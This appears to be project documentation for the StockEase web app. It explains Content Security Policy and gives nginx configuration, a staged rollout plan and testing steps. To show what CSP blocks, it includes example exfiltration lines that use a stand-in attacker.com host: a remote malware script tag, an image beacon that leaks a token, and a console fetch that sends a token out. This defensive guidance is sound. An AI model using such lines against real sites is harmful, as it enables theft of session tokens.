# Content Security Policy (CSP)

## Overview

Content Security Policy (CSP) is an HTTP header that tells the browser which external resources are allowed to load. This prevents XSS attacks and unauthorized script execution.

---

## What is CSP?

### Problem It Solves

**Without CSP:**
```html
<!-- Any malicious script can load and execute -->
<script src="https://attacker.com/malware.js"></script>
<!-- Injected via XSS -->

<!-- Any external resource can load -->
<img src="https://attacker.com/capture.gif?token=stolen">
<!-- Leaks data through image request -->
```

**With CSP:**
```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;

<!-- Malicious script blocked (not from allowed source) -->
<script src="https://attacker.com/malware.js"></script>  ❌ BLOCKED

<!-- External image blocked (attacker.com not allowed) -->
<img src="https://attacker.com/capture.gif">  ❌ BLOCKED
```

### CSP Directives

CSP uses directives to specify what types of resources can load from where.

| Directive | Controls | Examples |
|-----------|----------|----------|
| `default-src` | All resources | Scripts, styles, images, fonts |
| `script-src` | JavaScript files | `<script>` tags, event handlers |
| `style-src` | CSS stylesheets | `<link rel="stylesheet">`, `<style>` |
| `img-src` | Images | `<img>`, background images |
| `font-src` | Web fonts | `@font-face` in CSS |
| `connect-src` | API calls, WebSocket | `fetch()`, `XMLHttpRequest` |
| `frame-src` | Iframes | `<iframe>` |
| `media-src` | Audio/video | `<audio>`, `<video>` |
| `object-src` | Plugins | `<object>`, `<embed>` |

### Policy Sources

When specifying where resources can load from:

| Source | Allows | Example |
|--------|--------|---------|
| `'self'` | Same origin only | `https://frontend.stockease.com` |
| `'none'` | Block all | Never load this resource type |
| `'unsafe-inline'` | Inline code | `<script>code</script>` (not recommended) |
| `'unsafe-eval'` | eval() | `eval()`, `Function()` (not recommended) |
| `https:` | Any HTTPS | `https://cdn.example.com`, `https://anything.com` |
| `data:` | Data URLs | `data:image/png;base64,...` |
| Specific URL | Exact domain | `https://cdn.stockease.com` |

---

## Current StockEase CSP Configuration

### What We Have

Currently, StockEase does **NOT have an explicit CSP header** configured. This means the browser uses default policies.

### Why Add CSP?

1. **Extra Layer of Protection** — Even if input validation is bypassed, CSP can stop scripts from running
2. **Compliance** — OWASP and security standards recommend CSP
3. **Defense in Depth** — Multiple security layers

---

## Implementing CSP in StockEase

### Step 1: Add CSP Header (nginx)

Edit `ops/nginx/nginx.conf`:

```nginx
server {
  listen 80;
  server_name _;
  root /usr/share/nginx/html;

  # ... existing configuration ...

  # =========================================================================
  # Content Security Policy (CSP) Header
  # =========================================================================
  add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'unsafe-inline';
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com data:;
    img-src 'self' data: https:;
    connect-src 'self' https://api.stockease.com;
    frame-src 'none';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
  " always;

  # =========================================================================
  # CSP Report-Only (Testing Mode)
  # =========================================================================
  # Use this while testing CSP to see violations without blocking
  # add_header Content-Security-Policy-Report-Only "..." always;
}
```

**Explanation:**

| Directive | Setting | Why |
|-----------|---------|-----|
| `default-src 'self'` | Block external by default | Most restrictive, safest |
| `script-src 'self' 'unsafe-inline'` | Allow local and inline scripts | Needed for React inline event handlers |
| `style-src 'self' 'unsafe-inline'` | Allow local and inline CSS | Tailwind uses inline styles |
| `font-src 'self' https://fonts.gstatic.com` | Allow Google Fonts | App uses Google Fonts |
| `img-src 'self' data: https:` | Allow local, data URLs, HTTPS images | Display images from various sources |
| `connect-src 'self'` | Only allow API calls to same origin | No external API calls |
| `frame-src 'none'` | Block iframes completely | Prevent clickjacking |
| `object-src 'none'` | Block plugins | No Flash, Java, etc. |

### Step 2: Report-Only Mode (Recommended First Step)

**Start with Report-Only** to test without breaking anything:

```nginx
# This logs violations but doesn't block
add_header Content-Security-Policy-Report-Only "
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com data:;
  img-src 'self' data: https:;
  connect-src 'self' https://api.stockease.com;
  frame-src 'none';
  object-src 'none';
" always;
```

**Test in production:**
1. Deploy with Report-Only header
2. Monitor browser console for CSP violations
3. Monitor server logs for reported violations
4. Fix violations one by one
5. Switch to enforcing CSP

### Step 3: Monitor Violations

CSP violations appear in:
- Browser console (DevTools → Console)
- Network logs if report-uri configured
- Server logs

**Example violation in console:**
```
Refused to load the script 'https://attacker.com/xss.js' because 
it violates the following Content Security Policy directive: 
"script-src 'self' 'unsafe-inline'".
```

---

## Rollout Strategy

### Phase 1: Report-Only Mode (1-2 weeks)

```nginx
# Monitor for violations
add_header Content-Security-Policy-Report-Only "..." always;
```

**Actions:**
1. Deploy to staging
2. Run full test suite
3. Check for console violations
4. Adjust policy based on findings

### Phase 2: Enforce Permissive CSP (1 week)

```nginx
# This enforces CSP but is still fairly permissive
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  ...
" always;
```

**Keep unsafe directives for first week:**
- `'unsafe-inline'` — Gradual elimination
- `'unsafe-eval'` — Usually not needed, remove ASAP

### Phase 3: Enforce Strict CSP (Ongoing)

```nginx
# Remove unsafe directives over time
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self';  # No unsafe-inline
  style-src 'self' https://fonts.googleapis.com;  # No unsafe-inline
  ...
" always;
```

**Benefits:**
- Strongest protection against XSS
- Requires app refactoring (inline handlers → event listeners)

---

## Dealing with `unsafe-inline`

### Why It's Needed (Currently)

StockEase may use inline styles and handlers:
```tsx
// Inline styles
<div style={{ color: 'red' }}>Text</div>

// Inline event handlers
<button onClick={() => handleClick()}>Click</button>
```

### Why It's Risky

`'unsafe-inline'` allows any inline code, defeating XSS protection:
```javascript
// Attacker injects inline code via XSS
<div style="background: url('javascript:stealToken()')">
// This would execute with 'unsafe-inline'
```

### Gradual Elimination

**Step 1: Extract Inline Styles**
```typescript
// Before (inline)
<div style={{ color: 'red' }}>Text</div>

// After (CSS class)
<div className="text-red">Text</div>
```

**Step 2: Use CSS Modules**
```typescript
import styles from './Button.module.css';

<button className={styles.primary}>Click</button>
```

**Step 3: Remove unsafe-inline from CSP**
```nginx
# No more 'unsafe-inline'
script-src 'self';
style-src 'self' https://fonts.googleapis.com;
```

---

## Testing CSP

### Browser DevTools Testing

1. Open DevTools (F12)
2. Go to Console tab
3. Try these actions:
   - Click buttons (should work)
   - Load images (should work)
   - Refresh page (should work)
   - Try injecting script: `<script>alert('xss')</script>` (should fail)

### Check CSP Header

```bash
# View CSP header
curl -i https://frontend.stockease.com | grep -i "content-security-policy"

# Output:
# Content-Security-Policy: default-src 'self'; ...
```

### Simulate XSS Attack

```bash
# Try to load external script (should fail with CSP)
curl -X GET "https://frontend.stockease.com" \
  -H "X-Requested-With: XMLHttpRequest"

# In browser console:
# Try: fetch('https://attacker.com/steal?token=' + token)
# Should fail due to 'connect-src 'self''
```

---

## Common CSP Violations & Fixes

### Issue 1: Google Fonts Blocked

**Error:**
```
Refused to load https://fonts.googleapis.com/css
because it violates the following CSP directive
```

**Fix:**
```nginx
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com data:;
```

### Issue 2: Inline Styles Blocked

**Error:**
```
Refused to apply inline style
because it violates CSP directive
```

**Causes:**
- `<div style="color: red">` (inline style attribute)
- `<style>` tags in HTML
- Tailwind inline styles

**Fix Option 1:** Add 'unsafe-inline' (temporary)
```nginx
style-src 'self' 'unsafe-inline';
```

**Fix Option 2:** Extract to CSS file (better)
```css
/* styles.css */
.red-text {
  color: red;
}
```
```tsx
<div className="red-text">Text</div>
```

### Issue 3: API Calls Blocked

**Error:**
```
Refused to connect to https://api.stockease.com/api/products
because it violates CSP directive
```

**Fix:**
```nginx
connect-src 'self' https://api.stockease.com;
```

### Issue 4: Inline Event Handlers Blocked

**Error:**
```
Refused to execute inline event handler
because it violates CSP directive
```

**Cause:**
```tsx
<button onclick="handleClick()">Click</button>
```

**Fix:**
```tsx
// Use React event binding (automatic)
<button onClick={handleClick}>Click</button>
// React handles this safely
```

---

## CSP Best Practices

### ✅ DO:

- ✅ Start with Report-Only mode
- ✅ Test thoroughly before enforcing
- ✅ Keep CSP header in nginx (not HTML meta tag)
- ✅ Use 'self' as default
- ✅ Whitelist specific domains
- ✅ Remove 'unsafe-inline' over time
- ✅ Monitor violations in production
- ✅ Update CSP when adding new external resources

### ❌ DON'T:

- ❌ Use `default-src *` (defeats purpose)
- ❌ Allow 'unsafe-eval' (not needed in modern apps)
- ❌ Keep 'unsafe-inline' forever (security risk)
- ❌ Trust CSP alone (combine with input validation)
- ❌ Ignore CSP violations
- ❌ Use meta tags for CSP (use headers instead)

---

## Related Files

- **nginx Config:** `ops/nginx/nginx.conf`
- **index.html:** `index.html`
- **API Client:** `src/services/apiClient.ts`
- **Auth Security:** See [JWT Tokens](../auth/jwt-tokens.md)
- **XSS Prevention:** See [XSS & Sanitization](./xss-and-sanitization.md)

---

## References

- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Policy Generator](https://csp-evaluator.withgoogle.com/)

---

**Last Updated:** November 13, 2025  
**Status:** Recommended Implementation  
**Priority:** High (Defense in Depth)
